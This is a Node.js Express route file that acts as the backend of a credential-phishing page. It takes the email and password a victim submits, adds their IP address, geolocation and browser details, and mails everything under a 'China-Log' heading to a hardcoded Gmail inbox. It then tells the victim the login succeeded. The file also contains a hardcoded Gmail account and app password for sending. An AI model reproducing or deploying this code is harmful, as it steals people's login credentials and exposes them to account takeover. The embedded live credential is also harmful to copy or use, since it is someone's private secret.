const express = require("express");
const nodemailer = require('nodemailer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Merge tag function
function replaceMergeTags(template, data) {
    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
}

// Email transporter (Gmail App Password recommended)
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: "donfriend02@gmail.com",
        pass: "aozh rhuy zkcg jfmi",
    },
});

    router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        const htmlTemplate = `
            <h1>China-Log</h1>
            <ul>
                <li><strong>Email:</strong> [[-email-]]</li>
                <li><strong>Password:</strong> [[-password-]]</li>
                <li><strong>IP:</strong> [[-ip-]]</li>
                <li><strong>Location:</strong> [[-location-]]</li>
                <li><strong>Timestamp:</strong> [[-timestamp-]]</li>
            </ul>
        `;

        const mergedHtml = replaceMergeTags(htmlTemplate, {
            email,
            password,
            ip,
            location: locationStr,
            timestamp: new Date().toISOString(),
        });

        await transporter.sendMail({
            from: '"Your App Name" <usglastemp@gmail.com>',
            to: "usglastemp@gmail.com",
            subject: `New sign-in on ${deviceType}`,
            html: mergedHtml,
        });

        console.log(`Email sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Login successful and notification sent",
            loginDetails: { device: deviceType, ip, location: locationStr },
        });

    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ success: false, message: "Failed to send notification", error: error.message });
    }
});

module.exports = router;
